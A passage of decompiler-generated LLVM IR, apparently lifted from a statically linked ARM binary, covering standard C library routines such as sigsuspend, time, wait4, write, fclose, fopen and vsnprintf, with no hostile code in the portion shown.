  store i32 %v2_10984, i32* @r4, align 4
  ret i32 %v0_10980

; uselistorder directives
  uselistorder i32 %v7_1095c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10980, { 1, 0 }
  uselistorder label %dec_label_pc_1097c, { 1, 0 }
  uselistorder label %dec_label_pc_1095c, { 1, 0 }
}

define i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10988 = load i32, i32* @r4, align 4
  store i32 %v3_10988, i32* %stack_var_-8, align 4
  %v3_10990 = call i32 @sigsuspend(%_TYPEDEF_sigset_t* %arg1)
  store i32 %v3_10990, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_10990, -4095
  br i1 %tmp, label %dec_label_pc_109b0, label %dec_label_pc_109a0

dec_label_pc_109a0:                               ; preds = %entry
  %v0_109a0 = call i32 @__errno_location()
  %v0_109a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_109a4 = sub i32 0, %v0_109a4
  %v2_109a8 = inttoptr i32 %v0_109a0 to i32*
  store i32 %v1_109a4, i32* %v2_109a8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_109b0

dec_label_pc_109b0:                               ; preds = %entry, %dec_label_pc_109a0
  %v0_109b0 = phi i32 [ %v3_10990, %entry ], [ -1, %dec_label_pc_109a0 ]
  %v2_109b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_109b4, i32* @r4, align 4
  ret i32 %v0_109b0

; uselistorder directives
  uselistorder i32 %v3_10990, { 1, 0, 2 }
  uselistorder label %dec_label_pc_109b0, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_109b8 = load i32, i32* @r4, align 4
  store i32 %v3_109b8, i32* %stack_var_-8, align 4
  %v2_109bc = call i32 @time(i32* %arg1)
  store i32 %v2_109bc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_109bc, -4095
  br i1 %tmp, label %dec_label_pc_109dc, label %dec_label_pc_109cc

dec_label_pc_109cc:                               ; preds = %entry
  %v0_109cc = call i32 @__errno_location()
  %v0_109d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_109d0 = sub i32 0, %v0_109d0
  %v2_109d4 = inttoptr i32 %v0_109cc to i32*
  store i32 %v1_109d0, i32* %v2_109d4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_109dc

dec_label_pc_109dc:                               ; preds = %entry, %dec_label_pc_109cc
  %v0_109dc = phi i32 [ %v2_109bc, %entry ], [ -1, %dec_label_pc_109cc ]
  %v2_109e0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_109e0, i32* @r4, align 4
  ret i32 %v0_109dc

; uselistorder directives
  uselistorder i32 %v2_109bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_109dc, { 1, 0 }
}

define i32 @__libc_wait(i32 %arg1) local_unnamed_addr {
entry:
  %v0_109f4 = call i32 @wait4()
  ret i32 %v0_109f4
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_109f8 = load i32, i32* @r4, align 4
  store i32 %v3_109f8, i32* %stack_var_-8, align 4
  %v0_109fc = call i32 @wait4()
  store i32 %v0_109fc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_109fc, -4095
  br i1 %tmp, label %dec_label_pc_10a1c, label %dec_label_pc_10a0c

dec_label_pc_10a0c:                               ; preds = %entry
  %v0_10a0c = call i32 @__errno_location()
  %v0_10a10 = load i32, i32* %r4.global-to-local, align 4
  %v1_10a10 = sub i32 0, %v0_10a10
  %v2_10a14 = inttoptr i32 %v0_10a0c to i32*
  store i32 %v1_10a10, i32* %v2_10a14, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10a1c

dec_label_pc_10a1c:                               ; preds = %entry, %dec_label_pc_10a0c
  %v0_10a1c = phi i32 [ %v0_109fc, %entry ], [ -1, %dec_label_pc_10a0c ]
  %v2_10a20 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10a20, i32* @r4, align 4
  ret i32 %v0_10a1c

; uselistorder directives
  uselistorder i32 %v0_109fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10a1c, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_10a28 = call i32 @wait4()
  ret i32 %v0_10a28
}

define i32 @__libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10a2c = load i32, i32* @r4, align 4
  store i32 %v3_10a2c, i32* %stack_var_-8, align 4
  %v0_10a30 = call i32 @write()
  store i32 %v0_10a30, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10a30, -4095
  br i1 %tmp, label %dec_label_pc_10a50, label %dec_label_pc_10a40

dec_label_pc_10a40:                               ; preds = %entry
  %v0_10a40 = call i32 @__errno_location()
  %v0_10a44 = load i32, i32* %r4.global-to-local, align 4
  %v1_10a44 = sub i32 0, %v0_10a44
  %v2_10a48 = inttoptr i32 %v0_10a40 to i32*
  store i32 %v1_10a44, i32* %v2_10a48, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10a50

dec_label_pc_10a50:                               ; preds = %entry, %dec_label_pc_10a40
  %v0_10a50 = phi i32 [ %v0_10a30, %entry ], [ -1, %dec_label_pc_10a40 ]
  %v2_10a54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10a54, i32* @r4, align 4
  ret i32 %v0_10a50

; uselistorder directives
  uselistorder i32 %v0_10a30, { 1, 0, 2 }
  uselistorder i32 ()* @write, { 1, 0 }
  uselistorder label %dec_label_pc_10a50, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10a60 = icmp slt i32 %arg1, 0
  br i1 %v1_10a60, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_10a60 = mul i32 %arg1, 2
  %v2_10a6c = load i32, i32* @global_var_2a884, align 4
  %v2_10a70 = add i32 %v2_10a6c, %v2_10a60
  %v3_10a74 = inttoptr i32 %v2_10a70 to i8*
  %v4_10a74 = load i8, i8* %v3_10a74, align 1
  %v6_10a74 = zext i8 %v4_10a74 to i32
  %v1_10a78 = add i32 %v2_10a70, 1
  %v2_10a78 = inttoptr i32 %v1_10a78 to i8*
  %v3_10a78 = load i8, i8* %v2_10a78, align 1
  %v4_10a78 = zext i8 %v3_10a78 to i32
  %v3_10a7c = mul nuw i32 %v4_10a78, 16777216
  %v4_10a80 = sdiv i32 %v3_10a7c, 65536
  %v5_10a80 = or i32 %v4_10a80, %v6_10a74
  ret i32 %v5_10a80

; uselistorder directives
  uselistorder i32 %v2_10a70, { 1, 0 }
}

define i32 @__GI_fclose(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_10a8c = load i32, i32* @r4, align 4
  store i32 %v3_10a8c, i32* %stack_var_-32, align 4
  %v6_10a8c = load i32, i32* @r5, align 4
  %v9_10a8c = load i32, i32* @r6, align 4
  %v12_10a8c = load i32, i32* @r7, align 4
  %v15_10a8c = load i32, i32* @r8, align 4
  %v18_10a8c = load i32, i32* @sb, align 4
  %v21_10a8c = load i32, i32* @sl, align 4
  %v2_10a90 = add i32 %tmp, 52
  %v3_10a90 = inttoptr i32 %v2_10a90 to i32*
  %v4_10a90 = load i32, i32* %v3_10a90, align 4
  store i32 %v4_10a90, i32* @r8, align 4
  %v2_10a94 = add i32 %tmp, 56
  store i32 %v2_10a94, i32* @r5, align 4
  %v2_10a98 = ptrtoint i32* %stack_var_-64 to i32
  %v2_10a9c = icmp eq i32 %v4_10a90, 0
  store i1 %v2_10a9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 %v2_10a94, i32* @r2, align 4
  %v2_10aac = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10aac, i32* @r0, align 4
  br i1 %v2_10a9c, label %dec_label_pc_10ab4, label %dec_label_pc_10ad0

dec_label_pc_10ab4:                               ; preds = %entry
  store i32 58060, i32* %r3.global-to-local, align 4
  %v1_10abc = call i32 @__pthread_cleanup_push_defer()
  %v0_10ac0 = load i32, i32* @r5, align 4
  store i32 62768, i32* %r3.global-to-local, align 4
  %v2_10acc = call i32 @pthread_mutex_lock(i32 %v0_10ac0)
  %v0_10ad0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10ad0

dec_label_pc_10ad0:                               ; preds = %entry, %dec_label_pc_10ab4
  %v0_10ad8 = phi i32 [ %tmp, %entry ], [ %v0_10ad0.pre, %dec_label_pc_10ab4 ]
  %v1_10ad0 = inttoptr i32 %v0_10ad8 to i8*
  %v2_10ad0 = load i8, i8* %v1_10ad0, align 1
  %v3_10ad0 = zext i8 %v2_10ad0 to i32
  %v1_10ad4 = and i32 %v3_10ad0, 64
  store i32 %v1_10ad4, i32* %r3.global-to-local, align 4
  %v2_10ad4 = icmp eq i32 %v1_10ad4, 0
  store i1 %v2_10ad4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10ad4, i32* @r7, align 4
  br i1 %v2_10ad4, label %dec_label_pc_10aec, label %dec_label_pc_10ae4

dec_label_pc_10ae4:                               ; preds = %dec_label_pc_10ad0
  %v3_10ae4 = call i32 @fflush_unlocked(i8* %v1_10ad0)
  store i32 %v3_10ae4, i32* @r7, align 4
  %v0_10aec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10aec

dec_label_pc_10aec:                               ; preds = %dec_label_pc_10ad0, %dec_label_pc_10ae4
  %v0_10aec = phi i32 [ %v0_10ad8, %dec_label_pc_10ad0 ], [ %v0_10aec.pre, %dec_label_pc_10ae4 ]
  %v1_10aec = add i32 %v0_10aec, 4
  %v2_10aec = inttoptr i32 %v1_10aec to i32*
  %v3_10aec = load i32, i32* %v2_10aec, align 4
  store i32 %v3_10aec, i32* @r0, align 4
  %v1_10af0 = call i32 @__libc_close(i32 %v3_10aec)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10af8 = icmp slt i32 %v1_10af0, 0
  %v2_10af8 = icmp eq i32 %v1_10af0, 0
  store i1 %v2_10af8, i1* %cpsr_z.global-to-local, align 1
  %v1_10afc = load i32, i32* @r4, align 4
  %v2_10afc = add i32 %v1_10afc, 4
  %v3_10afc = inttoptr i32 %v2_10afc to i32*
  store i32 -1, i32* %v3_10afc, align 4
  store i32 ptrtoint (i32* @global_var_2a8b8.557 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 %v2_10a98, i32* @r0, align 4
  store i32 58060, i32* @sb, align 4
  br i1 %v1_10af8, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_10aec
  %v3_10b10 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_10b10, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_10aec, %bb
  store i32 62768, i32* @sl, align 4
  %v1_10b1c = call i32 @__pthread_cleanup_push_defer()
  %v2_10b28 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2a8b8.557 to i32))
  %v2_10b30 = load i32, i32* @global_var_2d1d0.559, align 4
  %v1_10b34 = add i32 %v2_10b30, 1
  store i32 %v1_10b34, i32* %r3.global-to-local, align 4
  store i32 %v1_10b34, i32* @global_var_2d1d0.559, align 4
  store i32 %v2_10a98, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 58236, i32* @r5, align 4
  store i32 68432, i32* @lr, align 4
  %v1_10b4c = call i32 @__pthread_cleanup_pop_restore()
  %v0_10b50 = load i32, i32* @r4, align 4
  %v1_10b50 = inttoptr i32 %v0_10b50 to i32*
  %v2_10b50 = load i32, i32* %v1_10b50, align 4
  %v1_10b54 = and i32 %v2_10b50, 24576
  store i32 %v1_10b54, i32* %r3.global-to-local, align 4
  %v3_10b581 = udiv i32 %v1_10b54, 256
  %v1_10b5c = trunc i32 %v3_10b581 to i8
  %v3_10b5c = add i32 %v0_10b50, 1
  %v4_10b5c = inttoptr i32 %v3_10b5c to i8*
  store i8 %v1_10b5c, i8* %v4_10b5c, align 1
  %v0_10b60 = load i32, i32* %r3.global-to-local, align 4
  %v1_10b60 = trunc i32 %v0_10b60 to i8
  %v2_10b60 = load i32, i32* @r4, align 4
  %v3_10b60 = inttoptr i32 %v2_10b60 to i8*
  store i8 %v1_10b60, i8* %v3_10b60, align 1
  %v0_10b64 = load i32, i32* @r4, align 4
  %v1_10b64 = inttoptr i32 %v0_10b64 to i32*
  %v2_10b64 = load i32, i32* %v1_10b64, align 4
  %v1_10b68 = or i32 %v2_10b64, 48
  store i32 %v1_10b68, i32* %r3.global-to-local, align 4
  %v3_10b6c = sdiv i32 %v2_10b64, 256
  %v0_10b70 = load i32, i32* @r8, align 4
  %v2_10b70 = icmp eq i32 %v0_10b70, 0
  store i1 %v2_10b70, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_10a98, i32* @r6, align 4
  store i32 %v2_10aac, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  %v1_10b80 = trunc i32 %v3_10b6c to i8
  %v3_10b80 = add i32 %v0_10b64, 1
  %v4_10b80 = inttoptr i32 %v3_10b80 to i8*
  store i8 %v1_10b80, i8* %v4_10b80, align 1
  %v0_10b84 = load i32, i32* %r3.global-to-local, align 4
  %v1_10b84 = trunc i32 %v0_10b84 to i8
  %v2_10b84 = load i32, i32* @r4, align 4
  %v3_10b84 = inttoptr i32 %v2_10b84 to i8*
  store i8 %v1_10b84, i8* %v3_10b84, align 1
  %v0_10b88 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10b88, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  store i32 68496, i32* @lr, align 4
  %v2_10b8c = call i32 @__pthread_cleanup_pop_restore()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_10b90 = load i32, i32* @r4, align 4
  %v1_10b90 = add i32 %v0_10b90, 1
  %v2_10b90 = inttoptr i32 %v1_10b90 to i8*
  %v3_10b90 = load i8, i8* %v2_10b90, align 1
  %v4_10b90 = zext i8 %v3_10b90 to i32
  store i32 %v4_10b90, i32* %r3.global-to-local, align 4
  %v1_10b94 = and i32 %v4_10b90, 64
  %v2_10b94 = icmp eq i32 %v1_10b94, 0
  store i1 %v2_10b94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10b94, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_10b9c = xor i1 %v2_10b94, true
  call void @__pseudo_cond_branch(i1 %v1_10b9c, i32 ptrtoint (i32* @global_var_134b0.561 to i32))
  store i32 ptrtoint (i32* @global_var_2a8b8.557 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 %v2_10a98, i32* @r0, align 4
  %v1_10bb0 = call i32 @__pthread_cleanup_push_defer()
  %v2_10bbc = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2a8b8.557 to i32))
  %v2_10bc4 = load i32, i32* @global_var_2d1d4.564, align 4
  %v1_10bc8 = add i32 %v2_10bc4, 1
  store i32 %v1_10bc8, i32* %r3.global-to-local, align 4
  store i32 %v2_10a98, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_10bc8, i32* @global_var_2d1d4.564, align 4
  store i32 68576, i32* @lr, align 4
  %v1_10bdc = call i32 @__pthread_cleanup_pop_restore()
  %v1_10be0 = call i32 @_stdio_openlist_dec_use(i32 %v1_10bdc)
  %v0_10be4 = load i32, i32* @r7, align 4
  %v2_10bec = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_10bec, i32* @r4, align 4
  store i32 %v6_10a8c, i32* @r5, align 4
  store i32 %v9_10a8c, i32* @r6, align 4
  store i32 %v12_10a8c, i32* @r7, align 4
  store i32 %v15_10a8c, i32* @r8, align 4
  store i32 %v18_10a8c, i32* @sb, align 4
  store i32 %v21_10a8c, i32* @sl, align 4
  ret i32 %v0_10be4

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_10aec, { 1, 0 }
  uselistorder label %dec_label_pc_10ad0, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_10c14 = call i32 @_stdio_fopen()
  ret i32 %v0_10c14
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  store i32 -1, i32* @r1, align 4
  %v0_10c24 = call i32 @__GI_vsnprintf()
  ret i32 %v0_10c24
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_10c34 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_10c34, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_10c48 = call i32 @__GI_vsnprintf()
  ret i32 %v0_10c48

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_10c5c = load i32, i32* @r4, align 4
  %v6_10c5c = load i32, i32* @r5, align 4
  %v12_10c5c = load i32, i32* @r7, align 4
  %v15_10c5c = load i32, i32* @r8, align 4
  %v18_10c5c = load i32, i32* @sl, align 4
  %v0_10c60 = load i32, i32* @r3, align 4
  store i32 %v0_10c60, i32* @r8, align 4
  %v2_10c64 = ptrtoint i32* %stack_var_-108 to i32
  %v0_10c6c = load i32, i32* @r0, align 4
  %v1_10c6c = sub i32 -1, %v0_10c6c
  store i32 %v1_10c6c, i32* @r5, align 4
  store i32 %v0_10c6c, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_10c80 = load i32, i32* @r1, align 4
  %v3_10c80 = icmp ult i32 %v1_10c6c, %v1_10c80
  br i1 %v3_10c80, label %bb23, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_10c80, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %entry, %bb
  %v0_10c88 = load i32, i32* @r2, align 4
  store i32 %v0_10c88, i32* @r7, align 4
  %v2_10c8c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10c8c, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
  %v0_10ca8 = call i32 @__stdio_init_mutex()
  %v0_10cac = load i32, i32* @r4, align 4
  %v1_10cac = load i32, i32* @r5, align 4
  %v0_10cb4 = load i32, i32* @r7, align 4
  %v0_10cb8 = load i32, i32* @r8, align 4
  %v3_10cd8 = inttoptr i32 %v0_10cb4 to i8*
  %v4_10cd8 = call i32 @_vfprintf_internal(i32 %v2_10c64, i8* %v3_10cd8, i32 %v0_10cb8)
  %v0_10cdc = load i32, i32* @r5, align 4
  %v1_10cdc = load i32, i32* @sl, align 4
  %v9_10cdc = icmp eq i32 %v0_10cdc, %v1_10cdc
  br i1 %v9_10cdc, label %dec_label_pc_10d04, label %dec_label_pc_10ce8

dec_label_pc_10ce8:                               ; preds = %bb23
  %v9_10cf0 = icmp eq i32 %v1_10cac, 0
  %v1_10cf4 = sext i1 %v9_10cf0 to i32
  %v1_10cf4.v0_10cd0 = add i32 %v0_10cac, %v1_10cf4
  %stack_var_-92.0 = inttoptr i32 %v1_10cf4.v0_10cd0 to i8*
  %v1_10d00 = trunc i32 %v1_10cdc to i8
  store i8 %v1_10d00, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_10d04

dec_label_pc_10d04:                               ; preds = %bb23, %dec_label_pc_10ce8
  store i32 %v3_10c5c, i32* @r4, align 4
  store i32 %v6_10c5c, i32* @r5, align 4
  store i32 %v12_10c5c, i32* @r7, align 4
  store i32 %v15_10c5c, i32* @r8, align 4
  store i32 %v18_10c5c, i32* @sl, align 4
  ret i32 %v4_10cd8

; uselistorder directives
  uselistorder i32 %v1_10c80, { 1, 0 }
  uselistorder i32 %v0_10c6c, { 1, 0 }
  uselistorder label %dec_label_pc_10d04, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_10d0c = load i32, i32* @r4, align 4
  store i32 %v3_10d0c, i32* %stack_var_-24, align 4
  %v6_10d0c = load i32, i32* @r5, align 4
  %v9_10d0c = load i32, i32* @r6, align 4
  %v12_10d0c = load i32, i32* @r7, align 4
  %v15_10d0c = load i32, i32* @r8, align 4
  %v0_10d10 = load i32, i32* @r1, align 4
  %v1_10d10 = inttoptr i32 %v0_10d10 to i8*
  %v2_10d10 = load i8, i8* %v1_10d10, align 1
  %v7_10d14 = icmp eq i8 %v2_10d10, 114
  store i1 %v7_10d14, i1* %cpsr_z.global-to-local, align 1
  %v2_10d18 = ptrtoint i32* %stack_var_-56 to i32
  %v0_10d1c = load i32, i32* @r0, align 4
  store i32 %v0_10d1c, i32* @r6, align 4
  %v0_10d20 = load i32, i32* @r2, align 4
  store i32 %v0_10d20, i32* @r8, align 4
  %v0_10d24 = load i32, i32* @r3, align 4
  store i32 %v0_10d24, i32* @r5, align 4
  br i1 %v7_10d14, label %dec_label_pc_10d70, label %dec_label_pc_10d2c

dec_label_pc_10d2c:                               ; preds = %entry
  %v7_10d2c = icmp eq i8 %v2_10d10, 119
  store i1 %v7_10d2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d2c, label %bb, label %dec_label_pc_10d38

bb:                                               ; preds = %dec_label_pc_10d2c
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_10d74

dec_label_pc_10d38:                               ; preds = %dec_label_pc_10d2c
  %v7_10d38 = icmp eq i8 %v2_10d10, 97
  store i1 %v7_10d38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d38, label %bb30, label %dec_label_pc_10d44

bb30:                                             ; preds = %dec_label_pc_10d38
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_10d74

dec_label_pc_10d44:                               ; preds = %dec_label_pc_10d38, %dec_label_pc_10dfc, %dec_label_pc_10dd0
  %v0_10d44 = call i32 @__errno_location()
  store i32 %v0_10d44, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_10d4c = load i32, i32* @r8, align 4
  %v2_10d4c = icmp eq i32 %v0_10d4c, 0
  store i1 %v2_10d4c, i1* %cpsr_z.global-to-local, align 1
  %v2_10d50 = inttoptr i32 %v0_10d44 to i32*
  store i32 22, i32* %v2_10d50, align 4
  br i1 %v2_10d4c, label %dec_label_pc_10fc4, label %dec_label_pc_10d58

dec_label_pc_10d58:                               ; preds = %dec_label_pc_10e20._crit_edge, %dec_label_pc_10d44
  %v0_10d58 = load i32, i32* @r8, align 4
  %v1_10d58 = add i32 %v0_10d58, 1
  %v2_10d58 = inttoptr i32 %v1_10d58 to i8*
  %v3_10d58 = load i8, i8* %v2_10d58, align 1
  %v4_10d58 = zext i8 %v3_10d58 to i32
  store i32 %v4_10d58, i32* %r3.global-to-local, align 4
  %v1_10d5c = and i32 %v4_10d58, 32
  %v2_10d5c = icmp eq i32 %v1_10d5c, 0
  store i1 %v2_10d5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10d5c, label %dec_label_pc_10fc4, label %dec_label_pc_10d64

dec_label_pc_10d64:                               ; preds = %dec_label_pc_10d58
  store i32 %v0_10d58, i32* @r0, align 4
  %v0_10d68 = call i32 @free()
  store i32 %v0_10d68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10fc4

dec_label_pc_10d70:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_10d74

dec_label_pc_10d74:                               ; preds = %bb, %bb30, %dec_label_pc_10d70
  %v1_10d8c = phi i32 [ 1089, %bb30 ], [ 577, %bb ], [ 1, %dec_label_pc_10d70 ]
  %v1_10d74 = add i32 %v0_10d10, 1
  %v2_10d74 = inttoptr i32 %v1_10d74 to i8*
  %v3_10d74 = load i8, i8* %v2_10d74, align 1
  %v7_10d78 = icmp eq i8 %v3_10d74, 98
  store i1 %v7_10d78, i1* %cpsr_z.global-to-local, align 1
  %v1_10d74.v0_10d10 = select i1 %v7_10d78, i32 %v1_10d74, i32 %v0_10d10
  store i32 %v1_10d74.v0_10d10, i32* %r3.global-to-local, align 4
  %v1_10d84 = add i32 %v1_10d74.v0_10d10, 1
  %v2_10d84 = inttoptr i32 %v1_10d84 to i8*
  %v3_10d84 = load i8, i8* %v2_10d84, align 1
  %v4_10d84 = zext i8 %v3_10d84 to i32
  store i32 %v4_10d84, i32* %r3.global-to-local, align 4
  %v7_10d88 = icmp eq i8 %v3_10d84, 43
  store i1 %v7_10d88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d88, label %bb33, label %.thread4

bb33:                                             ; preds = %dec_label_pc_10d74
  store i32 %v1_10d8c, i32* %r3.global-to-local, align 4
  %v2_10d90 = add nuw nsw i32 %v1_10d8c, 1
  store i32 %v2_10d90, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_10d74, %bb33
  %v2_10d94 = icmp eq i32 %v0_10d20, 0
  store i1 %v2_10d94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10d94, label %dec_label_pc_10d9c, label %dec_label_pc_10dc8

dec_label_pc_10d9c:                               ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_10da0 = call i32 @malloc(i32 80)
  store i32 %v1_10da0, i32* %r0.global-to-local, align 4
  store i32 %v1_10da0, i32* @r8, align 4
  %v3_10da4 = icmp eq i32 %v1_10da0, 0
  store i1 %v3_10da4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10da4, label %dec_label_pc_10fc8, label %dec_label_pc_10dac

dec_label_pc_10dac:                               ; preds = %dec_label_pc_10d9c
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v3_10db4 = add i32 %v1_10da0, 1
  %v4_10db4 = inttoptr i32 %v3_10db4 to i8*
  store i8 32, i8* %v4_10db4, align 1
  %v0_10db8 = load i32, i32* %r2.global-to-local, align 4
  %v1_10db8 = load i32, i32* @r8, align 4
  %v2_10db8 = add i32 %v1_10db8, 8
  %v3_10db8 = inttoptr i32 %v2_10db8 to i32*
  store i32 %v0_10db8, i32* %v3_10db8, align 4
  %v0_10dbc = load i32, i32* %r2.global-to-local, align 4
  %v1_10dbc = trunc i32 %v0_10dbc to i8
  %v2_10dbc = load i32, i32* @r8, align 4
  %v3_10dbc = inttoptr i32 %v2_10dbc to i8*
  store i8 %v1_10dbc, i8* %v3_10dbc, align 1
  %v0_10dc0 = load i32, i32* @r8, align 4
  %v1_10dc0 = add i32 %v0_10dc0, 56
  store i32 %v1_10dc0, i32* @r0, align 4
  %v0_10dc4 = call i32 @__stdio_init_mutex()
  store i32 %v0_10dc4, i32* %r0.global-to-local, align 4
  %v0_10dc8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10dc8

dec_label_pc_10dc8:                               ; preds = %.thread4, %dec_label_pc_10dac
  %v0_10e20 = phi i32 [ %v0_10d24, %.thread4 ], [ %v0_10dc8.pre, %dec_label_pc_10dac ]
  %v1_10dc8 = icmp slt i32 %v0_10e20, 0
  %v2_10dc8 = icmp eq i32 %v0_10e20, 0
  store i1 %v2_10dc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_10dc8, label %dec_label_pc_10e20, label %dec_label_pc_10dd0

dec_label_pc_10dd0:                               ; preds = %dec_label_pc_10dc8
  %v0_10dd4 = load i32, i32* @r4, align 4
  %v2_10dd4 = and i32 %v0_10dd4, 131075
  %v1_10dd8 = add nuw nsw i32 %v2_10dd4, 1
  store i32 %v1_10dd8, i32* %r2.global-to-local, align 4
  %v0_10ddc = load i32, i32* @r6, align 4
  %v1_10ddc = add i32 %v0_10ddc, 1
  %v2_10de0 = and i32 %v1_10ddc, %v1_10dd8
